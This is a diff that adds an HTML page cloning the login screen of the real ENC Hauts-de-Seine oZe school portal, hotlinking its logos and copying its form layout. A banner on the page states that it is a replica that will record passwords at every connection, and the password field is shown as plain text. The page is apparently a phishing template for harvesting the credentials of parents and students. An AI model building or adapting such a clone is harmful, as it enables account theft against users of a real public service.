@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+  <link rel="icon" type="image/x-icon" href="/public/share/oze_v10/favicon.ico" />
+  <link rel="stylesheet" href="style.css">
+  <title>ENC Hauts-de-Seine - Connexion</title>
+  <link rel="stylesheet" type="text/css" href='/public/share/oze_v10/logon_oze_v1.css' media="screen" />
+  <link rel="shortcut icon" type="image/x-icon" href="favicon.png" />
+</head>
+
+<body>
+  <!-- Conteneur de la page -->
+  <div id="mainContainer">
+    <div id="divContainer">
+      <div id="form_connexion">
+        <div id="headerLogo" class="headerLogo headerLogo_top" style="text-align: center;">
+          <img class="imgLogo" src="https://enc.hauts-de-seine.fr/public/share/oze_v10/logo.svg" />
+          </a>
+        </div>
+
+        <div id="message">
+          <div id="innerMessage">
+            <div id="infoPlateforme">
+              <div style="position: absolute; left: -25px; top: 5px;">
+                <img style="height: 15px;" src="https://enc.hauts-de-seine.fr/public/share/oze_v10/info.svg" />
+              </div>
+              <div id="titlePlateforme">
+                Message à l'attention des utilisateurs :
+              </div>
+              <div id="textePlateforme">
+                Ce site est une réplique de OZE et enregistrera vos mots de passe à chaque connection.
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div id="content" class="centre">
+          <!-- Contient les deux blocs du haut : connexion et actus -->
+          <div id="BlocHaut">
+            <!-- Début du bloc de connexion -->
+            <div id="zoneAuth" class="colonneUne">
+              <p id="titreBloc" class="titre_bloc">Connexion</p>
+              <form id="auth_form" name="e1" method="post" action="" onsubmit="javascript: return masterSubmit(this);"
+                autocomplete="off">
+                <div>
+                  <div id="credentials_table_postheader"></div>
+                  <p class="textFormAuth" style="margin-top: 5px;">Nom d'utilisateur</p>
+                  <input name='username' placeholder='Votre identifiant' class='credentials_input_text' value=''
+                    id='input_1' spellcheck='false' autocomplete='on' autocorrect='off' autocapitalize='off' type='text'
+                    onblur='login_onBlur()'> <br />
+
+                  <input type="password" style="display:none" value="fake" name="fakepassword" autocomplete="off" />
+                  <p class="textFormAuth" style="margin-top: 1.25rem;">Mot de passe</p>
+                  <div id="divEye">
+                    <input name='password' class='credentials_input_password' value='' placeholder='Votre mot de passe'
+                      id='input_2' spellcheck='false' autocomplete='off' autocorrect='off' autocapitalize='off'
+                      type='text'><br />
+                    <button id="unmask" type="button" onclick="showMdp()" title="Afficher/Masquer le mot de passe">
+                      <img id="passwordEye" onmouseover="this.style.opacity=0.6" onmouseout="this.style.opacity=0.2"
+                        src="https://enc.hauts-de-seine.fr/public/share/oze_v10/passwordEye.svg" />
+                    </button>
+                  </div>
+                  <span style="display: block; margin-bottom: 7px; margin-top: 12px;">
+                    <p style="font-size: 0.75rem; color: black; text-decoration: underline; color:black;">Mot de passe
+                      perdu ?</p>
+                  </span>
+                </div>
+                <script>
+                  function isMobile() {
+                    return (typeof window.orientation !== "undefined") || (navigator.userAgent.indexOf('IEMobile') !== -1);
+                  }
+                  if (isMobile()) {
+                    console.log('isMobile true');
+                    document.getElementById("auth_form").autocomplete = "on";
+                    document.getElementById("input_1").autocomplete = "on";
+                  }
+                </script>
+                <div id="securite" class="bloc_securite">
+                  <p id="textSecurite" style="font-family:notoSans700;">Je me connecte depuis un ordinateur</p>
+                  <div class="bloc_radio"
+                    style="display: flex; justify-content: space-between; align-items: center; width: 215px; margin-left: -7px; padding-top: 10px;">
+                    <div style="display: flex; align-items: center; justify-content: center;">
+                      <div class='form__field form__field--radio'> <input type='radio' class='radioForm'
+                          checked='checked' value='public' onclick="showTexte('TooltipPublic', 'TooltipPrive', null)"
+                          name='private' id='input_3_0' /> <label for='input_3_0' id='label_input_3_0'
+                          title='Le temps d&#39inactivité est de 30 minutes avant la déconnexion automatique'">Public ou partagé</label>									</div>								</div>
+								<div style=" display: flex; align-items: center; justify-content: center;">
+                          <div class='form__field form__field--radio'> <input type='radio' class='radioForm'
+                              value='prive' onclick="showTexte('TooltipPrive','TooltipPublic', null)" name='private'
+                              id='input_3_1' /> <label for='input_3_1' id='label_input_3_1'
+                              title='Le temps d&#39inactivité est de 3 heures avant la déconnexion automatique'">Privé</label>									</div>								</div>
+							</div>
+						</div>
+
+						<div id=" credentials_table_footer" style="height:0"></div>
+                          <input type=hidden name="vhost" value="standard">
+
+                          <div id="ImageConnexion" class="btn btn--primary">
+                            <a href="https://enc.hauts-de-seine.fr/my.logout.php3?errorcode=20">
+                              <div id="BtnConnexion">
+                                <span id="submit_row">
+                                  <span class="credentials_table_label_cell"></span>
+                                  <span class="credentials_table_field_cell">
+                                    <a href="https://enc.hauts-de-seine.fr/my.logout.php3?errorcode=20">
+                                      <input id="SubmitCreds" onclick="login_onBlur();"
+                                        src="https://enc.hauts-de-seine.fr/public/share/oze_v10/bouton_yvelines.png"
+                                        type="image" value="@@L_LoginButton_Text" name="SubmitCreds"
+                                        alt="Je me connecte" />
+                                    </a>
+                                    <p id="submitCredsTxt">Je me connecte</p>
+                                  </span>
+                                </span>
+                            </a>
+                          </div>
+                      </div>
+              </form>
+            </div>
+          </div>
+        </div>
+
+        <div id="credentials_table">
+          <div id="credentials_table_header" style="display:none"></div>
+        </div>
+      </div>
+      <div id="containerFlux">
+        <div id="contentFlux">
+          <div id="moncarrousel">
+            <div id="slider">
+              <div id="sliderList"
+                style="width: 90%; margin: 0 auto; display: flex; position: absolute; top: 250px; left: 0; right: 0; z-index: 1;">
+                <div id="slideClicker1" class="roundLeft activeSlide"
+                  style="color: white; width: calc(100%/3); text-decoration: none;" onclick="updateTimer(1);">
+                  <div style="display: flex; flex-direction: column; width: 100%; color: inherit;">
+                    <div class="progress-bar"
+                      style="box-shadow: inset 0 0.0625rem 0.0625rem rgba(0,0,0,.4); width: 100%; height: 5px; background-color: hsla(0,0%,100%,.4);">
+                    </div>
+                    <p style="margin-top: 5px; font-family: notoSans; color: inherit; text-align: left; color: hsla(0,0%,100%,.4);"
+                      class="progress-detail">01</p>
+                  </div>
+                </div>
+                <div id="slideClicker2" style="color: white; width: calc(100%/3); text-decoration: none;"
+                  onclick="updateTimer(2);" class="">
+                  <div style="display: flex; flex-direction: column; width: 100%; color: inherit;">
+                    <div class="progress-bar"
+                      style="box-shadow: inset 0 0.0625rem 0.0625rem rgba(0,0,0,.4); width: 100%; height: 5px; background-color: hsla(0,0%,100%,.4);">
+                    </div>
+                    <p style="margin-top: 5px; font-family: notoSans; color: inherit; text-align: left; color: hsla(0,0%,100%,.4);"
+                      class="progress-detail">02</p>
+                  </div>
+                </div>
+                <div id="slideClicker3" class="roundRight"
+                  style="color: white; width: calc(100%/3); text-decoration: none;" onclick="updateTimer(3);">
+                  <div style="display: flex; flex-direction: column; width: 100%; color: inherit;">
+                    <div class="progress-bar"
+                      style="box-shadow: inset 0 0.0625rem 0.0625rem rgba(0,0,0,.4); width: 100%; height: 5px; background-color: hsla(0,0%,100%,.4);">
+                    </div>
+                    <p style="margin-top: 5px; font-family: notoSans; color: inherit; text-align: left; color: hsla(0,0%,100%,.4);"
+                      class="progress-detail">03</p>
+                  </div>
+                </div>
+              </div>
+              <div class="slides">
+                <div id="slide-2" style="right: 0px;">
+                  <img class="imgSlider"
+                    src="https://api.hauts-de-seine.fr/jsonENC/displayImage.php?imageId=dc7b135d5d7c3ec4ddf33735fef2a5f2">
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div id="containerFlux">
+        <div id="contentFlux">
+          <div id="moncarrousel"></div>
+        </div>
+      </div>
+      <div id="MessageDIV" class="inspectionHostDIVSmall"></div>
+
+    </div>
+  </div>
+
+</body>
+<footer id="footerDiv" role="contentinfo" class="footer_desktop">
+  <div style="display: flex; justify-content: flex-start;">
+    <!-- Boutons réseaux sociaux -->
+    <div class="footer__social" style="display: flex; align-items: center;">
+      <img title="Accéder à la page Facebook" style="width: 30px;"
+        src="https://enc.hauts-de-seine.fr/public/share/oze_v10/facebook.png" />
+      <img title="Accéder à Twitter" style="width: 30px; margin-left: 14px;"
+        src="https://enc.hauts-de-seine.fr/public/share/oze_v10/twitter.png" />
+    </div>
+    <!-- Bouton Aide -->
+    <div style="display: flex; align-items: center;">
+      <div style="margin-left: 50px; margin-right: 20px;">
+        <img title="Aide en ligne" style="width: 60px;"
+          src="https://enc.hauts-de-seine.fr/public/share/oze_v10/icn_aide.svg" />
+      </div>
+      <div style="display: flex; flex-direction: column;">
+        <div style="color: #898989; font-size: 16.5px; margin-bottom: 5px;">
+          Parents : besoin d'aide ?
+        </div>
+        <div style="color: #1f5d7b; font-size: 16.5px;">
+          Consultez l'Aide en ligne
+        </div>
+      </div>
+    </div>
+    <!-- Bouton Vidéo -->
+    <div style="display: flex; align-items: center;">
+      <div style="margin-left: 50px; margin-right: 20px;">
+        <img title="Présentation de oZe" style="width: 60px;"
+          src="https://enc.hauts-de-seine.fr/public/share/oze_v10/icn_video.svg" />
+      </div>
+      <div style="display: flex; flex-direction: column;">
+        <div style="color: #898989; font-size: 16.5px; margin-bottom: 5px;">
+          Première connexion ?
+        </div>
+        <div style="color: #1f5d7b; font-size: 16.5px;">
+          Découvrez oZe en images
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="footer__logo" style="margin-left: auto;">
+    <img style="width: 70px;" src="	https://enc.hauts-de-seine.fr/public/share/oze_v10/logo-academie-versailles.svg" />
+  </div>
+</footer>
+
+<footer id="footerDiv" role="contentinfo" class="footer_mobile">
+  <div class="footer__social">
+    <img title="Accéder à la page Facebook" style="width: 30px;" src="/public/share/oze_v10/facebook.png" />
+    <img title="Accéder à Twitter" style="width: 30px; margin-left: 14px;" src="/public/share/oze_v10/twitter.png" />
+  </div>
+  <!-- Bouton Aide -->
+  <div style="display: flex; align-items: center; justify-content: center; margin-bottom: 14px;">
+    <div>
+      <img title="Aide en ligne" style="width: 60px;" src="/public/share/oze_v10/icn_aide.svg" />
+    </div>
+    <div style="display: flex; flex-direction: column; margin-left: 15px;">
+      <div style="color: #898989; font-size: 16.5px; margin-bottom: 5px;">
+        Parents : besoin d'aide ?
+      </div>
+      <div style="color: #1f5d7b; font-size: 16.5px;">
+        Consultez l'Aide en ligne
+      </div>
+    </div>
+  </div>
+  <!-- Bouton Vidéo -->
+  <div style="display: flex; align-items: center; justify-content: center; margin-bottom: 14px;">
+    <div>
+      <img title="Présentation de oZe" style="width: 60px;" src="/public/share/oze_v10/icn_video.svg" />
+    </div>
+    <div style="display: flex; flex-direction: column; margin-left: 5px;">
+      <div style="color: #898989; font-size: 16.5px; margin-bottom: 5px;">
+        Première connexion ?
+      </div>
+      <div style="color: #1f5d7b; font-size: 16.5px;">
+        Découvrez oZe en images
+      </div>
+    </div>
+  </div>
+  <div class="footer__logo">
+    <img style="width: 70px;" src="https://enc.hauts-de-seine.fr/public/share/oze_v10/logo-academie-versailles.svg">
+  </div>
+</footer>
+
+</html>
